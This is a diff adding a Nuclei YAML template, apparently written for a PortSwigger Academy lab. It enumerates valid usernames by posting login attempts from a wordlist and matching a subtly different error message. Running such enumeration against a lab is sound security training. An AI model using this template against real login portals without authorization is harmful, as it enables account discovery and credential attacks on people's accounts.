@@ -1,0 +1,30 @@
+id: 2_lab_auth_portswigger_username_crack
+
+info:
+  name: Username enumeration via subtly different response
+  author: XI
+  severity: info
+  description: Username enumeration via subtly different response
+  reference: https://XI
+  tags: portswigger, learn, nuclei, auth
+
+http:
+  - raw:
+    - |
+      POST /login HTTP/2
+      Host: {{Host}}
+      Content-Type: application/x-www-form-urlencoded
+
+      username={{username}}&password=123
+
+    payloads:
+      username: ./usernames.txt
+
+    matchers:
+      - type: regex
+        regex: 
+          - "Invalid username or password[^.]"
+        part: body
+
+    cookie-reuse: true
+    stop-at-first-match: true
